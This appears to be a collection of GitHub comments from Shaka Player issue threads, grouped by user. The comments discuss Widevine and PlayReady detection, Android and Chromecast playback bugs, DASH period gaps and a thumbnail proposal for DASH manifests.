    "vinixwu": "I got the same error on basic code. It's triggered by navigator.requestMediaKeySystemAccess method used to test if certain key system is supported:\njavascript\nvar config = [{\n    \"initDataTypes\": [\"cenc\"],\n    \"audioCapabilities\": [{ \"contentType\": 'audio/mp4;codecs=\"mp4a.40.2\"' }],\n    \"videoCapabilities\": [{ \"contentType\": 'video/mp4;codecs=\"avc1.42E01E\"' }]\n}];\ntry {\n    navigator.\n        requestMediaKeySystemAccess(\"com.widevine.alpha\", config).\n        then(function (mediaKeySystemAccess) {\n            console.log('widevine support ok');\n        }).catch(function (e) {\n            console.log('no widevine support');\n            console.log(e);\n        });\n} catch (e) {\n    console.log('no widevine support');\n    console.log(e);\n}\nAdd robustness level setting to config object solved the problem:\njavascript\nvar config = [{\n    \"initDataTypes\": [\"cenc\"],\n    \"audioCapabilities\": [{ \"contentType\": 'audio/mp4;codecs=\"mp4a.40.2\"', robustness: 'SW_SECURE_CRYPTO' }],\n    \"videoCapabilities\": [{ \"contentType\": 'video/mp4;codecs=\"avc1.42E01E\"', robustness: 'SW_SECURE_CRYPTO' }]\n}];\nBesides, this warning only triggered when key system is \"com.widevine.alpha\". Add robustness setting to other key system like PlayReady and ClearKey causes exception and returns false negative result:\n\nDOMException: Unsupported keySystem or supportedConfigurations.. \n",
    "hghazzi": "I just tested it on Chrome 52.0.2743.98 on Android 6.0.1; Nexus 5X\nBuild/MTC20F, and got the error while playing Angel One (multicodec,\nmultilingual, Widevine) after accepting to play premium content.\nOn Mon, Sep 19, 2016 at 5:06 PM, Joey Parrish notifications@github.com\nwrote:\n\n@hghazzi https://github.com/hghazzi, I am unable to reproduce this on\nmy Nexus phone. What version of Android and Chrome are you using? What\nmake/model of Android device are you using?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/519#issuecomment-248126600,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdd5wMRGDbgFLqIpCdYJvZytyHX9qks5qrvlAgaJpZM4J88kU\n.\n. Hey Joey, \n\nI've tried it on 3 more devices, 2 of which are running Nougat. All have the same error. Only the R1 HD is not using a stock version of Android. \nChrome 53.0.2785.124; Android 7.0.0; Nexus 5X Build/NRD90R\nChrome 53.0.2785.124; Android 7.0.0; Nexus 6P Build/NRD90U\nChrome 53.0.2785.124; Android 6.0.0; R1 HD Build/MRA58K\n. Hey @joeyparrish, sorry for not getting back to you sooner. Here are the logs\n| Timestamp | Property | Value |\n| --- | --- | --- |\n| 00:00:00 00 | pipeline_state | kCreated |\n| 00:00:00 00 | event | WEBMEDIAPLAYER_CREATED |\n| 00:00:00 00 | url | blob:http://shaka-player-demo.appspot.com/5d1c0fca-37f4-405f-93ac-fb921fe5ee3c |\n| 00:00:00 01 | pipeline_state | kInitDemuxer |\n| 00:00:11 192 | duration | 60.021331 |\n| 00:00:11 840 | found_video_stream | true |\n| 00:00:11 840 | video_codec_name | vp9 |\n| 00:00:11 840 | found_audio_stream | true |\n| 00:00:11 840 | audio_codec_name | vorbis |\n| 00:00:11 841 | pipeline_state | kInitRenderer |\n| 00:00:11 856 | debug | DecryptingDemuxerStream: no decryptor |\n| 00:00:12 103 | audio_dds | false |\n| 00:00:12 103 | audio_decoder | MojoAudioDecoder |\n| 00:00:12 104 | debug | DecryptingDemuxerStream: no decryptor |\n| 00:00:12 173 | error | video decoder initialization failed |\n| 00:00:12 173 | pipeline_error | decoder: not supported |\n| 00:00:12 175 | pipeline_state | kStopping |\n| 00:00:12 175 | pipeline_state | kStopped |\n. Here you go @joeyparrish. Included the output from both commands.\nshaka-android-widevine-bugreport.txt.zip\nshaka-android-widevine-logs.txt\n. @bbert thanks for testing it out!. @joeyparrish @anurag42 I haven't tested this recently with the devices mentioned above, though it works on my Pixel 2 with the latest version of Chrome. I never created a chromium bug since you mentioned they were able to reproduce it, so figured that they already did. . Hey @joeyparrish, yeah, I was wondering why not extract the Key ID from the manifest automatically instead of requiring it to be provided in the configuration. \n. Ok, yeah, that makes sense. Thanks, for the info, Joey!\n. Thanks, Joey! Can you share the bug ticket when its created so we can keep track of it? \n. @joeyparrish @TheModMaker I encountered this exact same issue using v2.0.6 as well as master on Chrome 57. Here's the sample stream: https://akadash0-test.akamaized.net/test/clear/test-multi-audio/master.mpd\nIt is reproducible in the demo page, and verified that this started occurring between v2.0.0 and v2.0.1\nThoughts?. @TheModMaker Done. Stream worked fine for me. https://raw.githubusercontent.com/hghazzi/hghazzi.github.io/master/manifest.mpd. @joeyparrish Also, tested against the master branch to confirm if the issue was already resolved and looks like it hasn't.. Thanks for the info, @joeyparrish @birme. We're following on it to see if the issue will be resolved with clockSyncUri. @TheModMaker Looks like we need to get a new stream with the issue to test it out. Will close this issue until we can follow up on it.. Hey @joeyparrish @TheModMaker, I got another stream where I was able to reproduce this issue. I tried to set clockSyncUrl to use manifest uri, but did not work. It does the HEAD request and I see the Date header in the dev tool Network tab, but not in the response header in the code. Looks like a CORS issue, but I would have expected that it would work. Here's the manifest:\nhttp://convoypoc.vdc.netstream.com/__cl/dummy/__c/6085/__op/dash/__f/manifest.mpd\nThis does work in the DASH-IF player, though not very well.. Would this be resolved by https://github.com/google/shaka-player/issues/555? If so, any workarounds for the time being?. Thanks @joeyparrish, we will relay all the possible updates that can be made to the encoders and/or servers to our customers, so that they know how to troubleshoot it on their end.\nHowever, on our player, we want to be able to be able to error out if we encounter this issue with more live streams (we've encountered this twice so far).\nBased on the calculation mentioned in https://github.com/google/shaka-player/issues/386 by @tdrews\nIn general, the t= values in each SegmentTimeline (after dividing by timescale) should be around now - availabilityStartTime. This can be accomplished by setting availabilityStartTime to the publish time of the very first MPD (so long as the first timestamp in the first segment is 0).\nWe would like to handle this issue with live streams more gracefully, but would involve some changes in shaka-player. Either\n\n\nBe able to configure an acceptable deviation that the player will handle, and throw an error that we can use. Right now, it just infinitely buffers and outputs a console warning in the uncompiled version. \n\n\nOr expose the data that is in the PresentationTimeline object, so that we would be able to perform the calculation and error handling on our end. \n\n\nWould one of these or some other solution be valuable to the player? We're happy to take this on and contribute to the project. . Thanks for you feedback. I agree that we should stick to the spec from DASH IOP. We will relay to our customers to ensure that their MPD files conform to it.. After further investigation, looks like this is an issue in our player.. @theodab Awesome, thanks for looking into this! Verified that it's resolved on our player.. You're right. Sorry about that. Will try to get you a working one soon.\nOn Mar 15, 2017 7:31 PM, \"Jacob Trimble\" notifications@github.com wrote:\n\nThe link doesn't work for me (still getting 403 errors). A 403 error is\nForbidden. This means that I don't have permission to access to the\nasset. My guess would be that either you have a cookie that allows you to\naccess it or that server does IP filtering.\nTry accessing the URL from an Incognito window to see if you have cookies.\nAlso try accessing it from another location to see if it is being filtered\nby IP or location.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/724#issuecomment-286912253,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdQi-xp49iDyf0JtGuuSq6hNmw7lxks5rmHTSgaJpZM4MegM1\n.\n. Resolved in v2.0.7. Thank you! it was fixed by this.\n\nhttps://github.com/google/shaka-player/commit/03f9c60020a781e323447b69216b7019adc763f2. @joeyparrish Looks like it still not available outside of our network. Sorry for not getting back to you sooner. We were able to create a workaround that resolved the issue based on our findings. After testing it in v2.1.0, it looks like we ended up coming up with the same solution. We noticed that this would occur when the gap was before the start time and so we would seek to the start time.\nWe should be able to remove the workaround once we migrate to v2.1.0. Thanks!. Thanks for the info, gonna close the issue. Thanks!\nOn May 5, 2017 4:38 PM, \"Shaka Player Bot\" notifications@github.com wrote:\n\nClosed #783 https://github.com/google/shaka-player/issues/783 via\n8e8904a\nhttps://github.com/google/shaka-player/commit/8e8904a442f9bcfe6b98745c9c91a39d6a6fdfd5\n.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/783#event-1071208724, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdTyG4A6sx9LxjYIlMEwsCnJZwvz4ks5r24jEgaJpZM4NSJ-q\n.\n. Thanks, @joeyparrish and @TheModMaker . Since this is marked at v2.2.0, I'd be happy to fork and create a fix, if it can be cherry picked for the next release. I looked over the code that adds the audio and video tracks to the history, is there anything that I should be aware of?. Great, I figured it was something along those lines. Will try to get a PR up in the next week or so.. @joeyparrish We would like to collaborate with your team to develop the new implementation of the text tracks plugin. \n\nNot sure when the timeline for 2.2.0 is, but we would really like to help out and get it in there since our current workaround does not work well when we have multiple players on a page.. Awesome! Can you add me as a reviewer or let me know when a PR is up? Would love to take a look.. @ismena So this change is in master now? Is there a timeline for v2.2.0?. @joeyparrish Do you have an updated timeline for v2.2? And thanks for the upgrade guide, looks like the parser updates will give us what we need to fix our issues!. Thanks for the clarification!. @joeyparrish We are experiencing the same issue with a certificate. I will email you the link to the bin file, if you have any insight, it would be greatly appreciated.\nLet me know if you'd like me to create a new issue.. Mac/Chrome\nOn Aug 8, 2017 1:18 PM, \"Jeff Jassky\" notifications@github.com wrote:\n\nWhich OS and browser versions are you seeing this on?\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/810#issuecomment-321022909,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdVG9NnGFphIbFl63-sm7UN3TKRjXks5sWJhNgaJpZM4NdghJ\n.\n. Here's the output from the server I tried setting up. Which proxy are you using?\nproxy.txt\n. Would you be able to provide a sample working proxy, or the one that you\nused?\n\nOn Thu, Aug 10, 2017 at 6:46 PM, Joey Parrish notifications@github.com\nwrote:\n\n@hghazzi https://github.com/hghazzi, it seems like you have a bug in\nyour proxy. Unfortunately, I can't really offer proxy support here.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/810#issuecomment-321693785,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdQlYYVV8guiJXM7u0PmYepnK-s7zks5sW4hGgaJpZM4NdghJ\n.\n. WeThe servier is //widevine.licensekeyserver.com, but it also includes custom data passed into the header using the network configuration .... Just checking in, will this be released soon?. Thanks for the update, feel better!. Thanks, Joey. We started testing against master and still seeing an issue\nwith a stream that uses request headers. Trying to do some more debugging,\nhoping to share them once I verify it's the same issue.\n\nOn Jul 17, 2017 1:03 PM, \"Joey Parrish\" notifications@github.com wrote:\n\nThe fix for this has been cherry-picked and will be released in v2.1.5.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/890#issuecomment-315813741,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdZb4TEbD1AiBr862fbs0E1RWKeS5ks5sO5IogaJpZM4N81BP\n.\n. Actually, did some more testing, and the fix might be working. We'll do further verification once 2.1.5 is released.. Great, thanks!\n\nOn Mon, Jul 17, 2017 at 2:40 PM, Joey Parrish notifications@github.com\nwrote:\n\nThe tag is out, as is NPM. I am still pushing the release out through\nother channels, after which I'll announce via email. But you can go ahead\nwith the github tag or NPM release.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/890#issuecomment-315843944,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAjpdRkPVUvPQnGXoCVrBG7HQCmi_t-3ks5sO6qagaJpZM4N81BP\n.\n. Also, on devices that do work, we see the chrome popup which asks to Allow Protected Content (attached). On the devices that does not work, it does not appear even after all site settings are cleared. Same thing is happening on https://demo.castlabs.com/, which seems to be using the shaka player\n\n. @joeyparrish, We actually just enabled DASH in Safari, and were encountering this issue as well. Seen it with several streams, such as the azure stream and Angel One. Doesn't happen consistently, so don't think it's a content issue. Can create a new ticket and include more details. Able to reproduce it in the demo page.. @joeyparrish Yes, thanks for the clarification!. \n",
    "anurag42": "Hi, was this bug resolved? I am not able to play video on chrome on android.. ohk. Would you know if a corresponding bug was filed in Chrome? I could follow it up there.. ",
    "vahid-01": "Thank you. you can close that.\n. ",
    "dannyfinks": "Thank you @joeyparrish for following up. I'll contact the owners of the license server and get an update. \n. @joeyparrish that definitely helps. Thank you and @cpeterso for the quick follow up.. ",
    "toshi0383": "Fixed comment and rebased.\nAlso signed CLAs!\n. Fixed !\n. Fixed !\n. That's what I thought... I'll fix it.\n. ",
    "PatrikCarlander": "http://lbd.kaltura.com:8001/mapped/playlist-saas.php/disc/1/type/vod/manifest.mpd\nYour stream will play before commit 0df1ab0\nOr you can comment out code line 855, 856, 857 and 860 in streaming_engine.js\nIt's related to bug #545\n. http://lbd.kaltura.com:8001/mapped/playlist-saas.php/disc/1/type/vod/manifest.mpd\nYour stream will play before commit 0df1ab0\nOr you can comment out code line 855, 856, 857 and 860 in streaming_engine.js\nIt's related to bug #545\n. We have this problem with our regular multi period segmented templated streams. It's not many sample stream of this kind online. I just remove this in Ericsson fork of shaka player. But it would be better if we fix this here. Problem is as a said it get a segment reference after period ended. So if we have 2 min period bufferAhead will be 120 sec and that make us jump out the function.\n. What is wrong with reference stream GPAC \"live profile with five periods\"? It worked before this commit.\n. The  GPAC \"live profile with five periods\" should not be any problem to test with.\nI can send you a privet stream if you send me an mail to patrik.carlander@symbio.com (it's always sensitive to share broadcasters content).\n. I see the same issue with stream\nhttp://lbd.kaltura.com:8001/mapped/playlist-saas.php/disc/1/type/vod/manifest.mpd\nfrom bug #537\nWe get a bufferedAhead of 90 sec after period switch, which cause that we fall out of the function.\n. Thanks. This fix resolve the problem. \n. Shaka v2.4.4. Yes it's actually 4 requests 2 OPTIONS and 2 POST.. \n. Here is the reason\nshaka.media.DrmEngine.prototype.onEncrypted_ = function(event) {\nlet initData = new Uint8Array(event.initData);\nfirst initData array is 1604 length.\nsecond initData array is 802 length.\nIf you split first initData in 2 pieces, then both are equal to the second initData. \nBecause Uint8ArrayUtils.equal(initData, this.activeSessions_[i].initData)\nreturn false, Shaka do 2 license request with PlayReady with Edge.\nWe have to fix this because license request cost money.\nI don't know why first initData is duplicated, maybe stream issue by Unified Streaming (duplicated data in first segment) or issue with Edge.\nWe using Unified Streaming and have same issues with our streams.\nThis fix it, but I only check first part. \nfor (let i = 0; i < this.activeSessions_.length; ++i) { \n  let preInitData = (initData.length * 2 === this.activeSessions_[i].initData.length) ?    \n    this.activeSessions_[i].initData.slice(0, initData.length) : this.activeSessions_[i].initData;  \n  if (Uint8ArrayUtils.equal(initData, preInitData)) {\n    shaka.log.debug('Ignoring duplicate init data.');\n    return;\n  } \n}\n. ",
    "magreenblatt": "I'm testing using a local build of M53 on Windows (32-bit). In my local build with proprietary codecs  enabled (GN settings of \"proprietary_codecs=true ffmpeg_branding=Chrome\") and Widevine disabled the \"Angel One (multicodec, multilingual)\" and \"Angel One (multicodec, multilingual, ClearKey server)\" assets play. In the same build when I enable loading of Widevine version 1.4.8.903 the \"Angel One (multicodec, multilingual, Widevine)\" asset also plays.\nIf I create the same build without proprietary codecs then only the \"Angel One (multicodec, multilingual)\" option is enabled irrespective of whether Widevine is loaded. You can see the same behavior with the binaries here: http://opensource.spotify.com/cefbuilds/index.html (download the \"Sample Application\"). The support.html page reports the following:\n```\nMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\nv2.0.0\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"application/x-mpegurl\": false,\n    \"application/vnd.apple.mpegurl\": false,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"m3u8\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp4\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"audio/mp4\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": null,\n    \"com.widevine.alpha\": null,\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n```\nHow is Shaka player detecting the \"drm\" state? It's possible that this is a bug in Chromium -- some portion of the CDM detection logic being incorrectly gated on proprietary codec support.\n. I'm testing using a local build of M53 on Windows (32-bit). In my local build with proprietary codecs  enabled (GN settings of \"proprietary_codecs=true ffmpeg_branding=Chrome\") and Widevine disabled the \"Angel One (multicodec, multilingual)\" and \"Angel One (multicodec, multilingual, ClearKey server)\" assets play. In the same build when I enable loading of Widevine version 1.4.8.903 the \"Angel One (multicodec, multilingual, Widevine)\" asset also plays.\nIf I create the same build without proprietary codecs then only the \"Angel One (multicodec, multilingual)\" option is enabled irrespective of whether Widevine is loaded. You can see the same behavior with the binaries here: http://opensource.spotify.com/cefbuilds/index.html (download the \"Sample Application\"). The support.html page reports the following:\n```\nMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\nv2.0.0\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"application/x-mpegurl\": false,\n    \"application/vnd.apple.mpegurl\": false,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"m3u8\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp4\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"audio/mp4\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": true,\n    \"audio/webm\": true,\n    \"audio/webm; codecs=\\\"opus\\\"\": true,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": null,\n    \"com.widevine.alpha\": null,\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n```\nHow is Shaka player detecting the \"drm\" state? It's possible that this is a bug in Chromium -- some portion of the CDM detection logic being incorrectly gated on proprietary codec support.\n. @ddorwin: Thanks for the suggestion. After making your suggested change clearkey now shows up in the drm list:\n\"drm\": {\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null,\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": null\n  },\nHowever, Widevine is still not detected.\n. @ddorwin: Thanks for the suggestion. After making your suggested change clearkey now shows up in the drm list:\n\"drm\": {\n    \"com.microsoft.playready\": null,\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null,\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": null\n  },\nHowever, Widevine is still not detected.\n. Agreed, thanks for looking into this. I'll debug further in the native code and report back with my findings.\n. Agreed, thanks for looking into this. I'll debug further in the native code and report back with my findings.\n. After resolving an error in my code both Widevine and Clearkey support are now reporting correctly with the above change (adding { contentType: 'video/webm; codecs=\"vp9\"' } in DrmEngine.probeSupport). I've also verified that a local build of Shaka Player successfully plays \"Angel One (multicodec, multilingual, Widevine)\" with this change (I get a 6006 error and CDM playback stops after 10 seconds, but I believe that's expected since my test server isn't licensed to play the sample videos).\n. After resolving an error in my code both Widevine and Clearkey support are now reporting correctly with the above change (adding { contentType: 'video/webm; codecs=\"vp9\"' } in DrmEngine.probeSupport). I've also verified that a local build of Shaka Player successfully plays \"Angel One (multicodec, multilingual, Widevine)\" with this change (I get a 6006 error and CDM playback stops after 10 seconds, but I believe that's expected since my test server isn't licensed to play the sample videos).\n. ",
    "shintaroid": "Sorry I reported something inaccurate: I didn't follow exactly the same way, in fact I used a sample link for manifestUri:\nvar manifestUri = \"http://yt-dash-mse-test.commondatastorage.googleapis.com/media/car-20120827-manifest.mpd\" \nAlright, it seems Chrome doesn't support file://\n. ",
    "wipawan": "@joeyparrish thanks for quick reply! please see my response below:\n- What version of Shaka Player are you using?\n  I'm using Shaka Player v2. I installed via npm and run in compiled mode.\n- Can you reproduce the issue with our latest release version?\n  Yes.\n- Can you reproduce the issue with the latest code from master?\n  Yes.\n- Can you reproduce the issue using our demo app?\n  Yes.\nAudio tracks switching works perfectly with the player on Chrome browser. The issue seems to appear only when casting on Chromecast. \n. thanks @joeyparrish! \nsorry for the late reply. I managed to get to work by force seeking backward by one second (currentTime -= 1) . i'll keep a look out for the new version! \ud83d\udc4d \n. Hello, is there any comment on this issue? Your feedback will be much appreciated. Thank you!\n. Thanks @joeyparrish for your response.\nThe Chromecast device versions are my observation since it seems consistent that the issue only occurs on Chromecast 1. We've tried on a couple of units and all produced the same result.\nThe shaka-player resides on the receiver code. I'm just getting event messages from the sender and registering request filters is done on the receiver application. I can send you my application code through your email if you wish to see it. \nI've tried switching back to cast sdk media player library and it seems to be able to cast the next videos. \n. @joeyparrish Sure! Would you be able to provide your email address?\n. @joeyparrish Alright, thanks. I've just sent it to you :) \n. ",
    "pakerfeldt": "Joey,\nThanks for the response. I believe it might get difficult for us to change our backend at this moment unfortunately. I will discuss this with the team but having DashParser exported would suit us much better.\n. So, we are apparently looking for ways to encode thumbnail metadata into the manifest itself and figured that AdaptationSet actually fits pretty well. The DASH spec says:\n\nWithin a Period, material is arranged into Adaptation Sets (see 5.3.3). An Adaptation Set represents a set of interchangeable encoded versions of one or several media content components (see 5.3.4). \n\nAdding images here to me is not breaking the spec really. It could be argued as being another set of media content components. The spec seems pretty permissive. Whether used or not would be up to the client. Our current approach looks something like this:\n<AdaptationSet id=\"10\" contentType=\"image\" mimeType=\"image/jpeg\">\n     <Representation id=\"0\" width=\"1280\" height=\"720\" framerate=\"100\">\n         <BaseURL>http://cdn.example.com/c760d497c55344118cccfbe477e85315/dc806700ec1e4b33d0935f85a36bbf13/sprite_1280_720_100</BaseURL>\n     </Representation>\n     <Representation id=\"1\" width=\"1920\" height=\"1080\" framerate=\"100\">\n         <BaseURL>http://cdn.example.com/c760d497c55344118cccfbe477e85315/dc806700ec1e4b33d0935f85a36bbf13/sprite_1920_1280_100</BaseURL>\n     </Representation>\n</AdaptationSet>\nThis works fine on Android using ExoPlayer. However, Shaka bails out since it seems to try to parse that media content. I would expect Shaka to ignore any adaptation sets it does not understand and proceed to playback the video/audio media defined. \nWe could of course, as suggested previously, go with a separate namespace in the manifest but given that ExoPlayer already handles this nicely (and even parses it out for us) it would be nice to at least have Shaka not fail playback completely. Another approach for us is to move away from DASH completely and use a proprietary format since we control both server and client side. \n. ",
    "unkiwii": "Updated the tests so it checks for the response header.\nWhen no content type is present in the uri, an empty string is returned as the content-type, maybe it should return an text/plain as default. What do you think?\n. I'm using videojs with shaka-player. When I cast, the video is unloaded and videojs controls are lost. I lose all control over the chromecast. I can't play/pause, change volume or change time. So I need the video to be loaded, but paused to still have access to controls.. @joeyparrish You're right, it can be problematic with concurrent playback on protected content. Forget about this, I will see how I can come with a solution unloading the local video.. ",
    "dovematrix": "Thanks, yes that is correct. \n. ",
    "agelun": "And the simpliest way is to support discontinuity between periods (when period1.start + period1.duration < period2.start). I've already made a patch for this and it would be great if you'll be able to review it.\n. Thanks, Joey. you can find my commit here:\nhttps://github.com/agelun/shaka-player/commit/d0b3fe58bf58f8ca72f904b37e199db104513402\nI didn't make a pull request because it breaks a lot of test cases and it's not ready for merge.\n. @joeyparrish can you explain why did you decide not to \"jump over\" the gap? Are there any tech reasons or just code style/simplicity/etc.?\nI thought about https://github.com/google/shaka-player/issues/462 as well and both cases can be solved if you create something like \"event bus\" for stream events, I think. There could be pushed MPD events from EventStream tag and discontinuity events (in case of periods interruption, empty periods and 404 responses \u2013 all from different sources) and application will be able to choose when/how to react on such events (for example, jump over, stuck, show error message etc. for discontinuity events). It can be used to draw informative timeline as well.\nI need to understand how can we progress with this issue, should we support our own branch to cover such \"real life\" requirements or it can be merged into google's code. Or, maybe, there are some more serious reasons I don't know about and it cannot work well at all?\n. Hello, Joey. Thanks for reply.\nStep by step:\n1. Broken content. Yes, It's a encoders and/or IP delivery (in case of multicast delivery) problem. But end user don't want to know it )) So it's better to \"hide\" such problem sometime instead of shout \"Hey, we/our streaming partner have dumb network admin, he cant configure QoS\" ) \n2. 404 with VoD content. I can agree with you in this part. Usually content provider is able to check content consistency before publishing. Especially in case of \"SegmentBase\" profile.\n3. 404 with Live. Maybe it'll be better to check server time from HTTP response header (?)\n4. Handling strategies. I think only second one will be \"production friendly\" because:\n- Automatic seek over gap can be surprising for end-user. Usually app developer wants to notify somehow about problem, switch to \"stub\" advertisement or disable such seek at all (for example when you'll be switched to another film. Imagine, your kid watched cartoons and suddenly was switched to some horror blockbuster )) )\n- Generated event can be used for monitoring purposes as well (to notify monitoring system about such discontinuity/gap)\n- Discontinuity events can be unified with other stream events (e.x. EventStream/Event from MPD). So it'll be more generic and more elegant.\nAnd I don't understand why you think it'll be more complex for app developer. Event can be ignored and playback will stop (like now).\n. Example fix based on https://github.com/peterolson/BigInteger.js attached.. ",
    "aztlan2k": "@joeyparrish @TheModMaker   Seems this was pushed out to vLater (not sure what that means) ... any chance this is still being actively considered/pursued?   Last update looks to be sometime late last year?\nif we're generating a live manifest and we experience a stream loss, it would be nice to be able to include an empty <Period duration=\"PTxS\"> element (as the spec indicates is acceptable) to account for that gap and know that shaka is going to properly jump that gap.  . @joeyparrish Thanks for the update!  Good to know.  We'll keep our eye out that design doc and progress on this in the future.  For our purposes, we plan on creating a period with placeholder content to bridge the gap.  Hopefully that'll get us past this for now.. ",
    "waaronking": "The nightly build completely fixes this issue for me! Thank you so much for your help.\nIs there a planned release in the near future, or will I need to compile and host the script myself to get this working on my site?\n. @joeyparrish perfect. This is now working great for me. Thanks for your help!\n. ",
    "Alex6015": "Hi Joey,\nThanks for the fast response\ni have misread the documentation in \"DRM Configuration\" section, it has \"license request format\" link, its for clear key license only now i understand.\nguess the request shaka player is sending to the license server is the \"payload\" the license server needs to pass to widevine,\nand if i want to pass additional parameters i would need to use \"License Wrapping\" and add any additional parameters like \"content id\" for example\nis that correct?\n. Got it.\nThank you!\n. ",
    "wilaw": "@Joey    - the current test vectors for trick mode http://testassets.dashif.org/#feature/details/57cd83dfb626efae4d44d450 are all sized 1280x720, so not suitable for thumbnail purposes \u2639\nI raised this issue with our test vector group and they are going to create some new vectors suitable for thumbnails. The vectors will have pure thumbnail-sized tracks, but there will also be some which have multiple trick mode tracks at different sizes, to exercise player logic in selecting the best trick mode track to use as a thumbnail. Waqar (cc\u2019d) is managing the creation of these new test vectors.\nCheers\nWill\n. Hey Joey\nThe DASH IF view has been that thumbnails should be generated from trick view tracks, rather than adding hundreds of jpegs to a package. Yes, the thumbnail would need to be rendered by a videoElement, either offscreen (and copied to a canvas element) or on-screen, with the thumb video element superimposed over the primary element.  The point about encryption is a fair point, although it would apply equally to the jpeg images themselves. In reality, small thumb videos that are keyframe-only would not require encryption.\nYour proposal for a new EssentialProperty looks clean and not the least bit crazy \u263a My only comment is that the @frameRate attribute would not be required. I will take it to DASH IF. I realize that playing another video requires essentially another player instance and this has a lot more overhead than loading and displaying some jpegs, so it\u2019s pretty clear to me personally that in a MSE player I would rather implement the jpeg approach than the second video element approach.\nHave you made a sample video with this adaption set? If not, we can collaborate on a Buck Bunny sample.\n. Actually it was pretty easy and fast to make a sample. I changed the manifest declaration a bit to make it more consistent. Let me know if this is what you had in mind:\nhttp://dash.edgesuite.net/akamai/bbb_30fps/bbb_with_thumbnails.mpd\n\n\n\n\n\n\nThis sample content has frame and timecode burnt in which is handy for checking positional consistency.\n. @TobbeEdgeware has created a proposal (or rather two) for how to provide thumbnail imags for scrollbars . DASH IF would like to standardize this and is open to input from @joeyparrish and Shaka.\nThe presentation from the dashjs f2f, and the proposal is available at https://github.com/Dash-Industry-Forum/DASH-IF-IOP/blob/master/thumbnails/README.md\nPlease provide comments in the issue thread https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues/119, or make pull requests towards the files if there is anything you\u2019d like to change.\nCheers\nWill\n. @chrisfillmore  - yes, thumbnail proposal was accepted in to DASH IF IOP 4.1 (see section 6.2.6 in http://dashif.org/wp-content/uploads/2017/09/DASH-IF-IOP-v4.1-clean.pdf) and will also be contributed back to MPEG. dash.js has thumbnail support on track for next 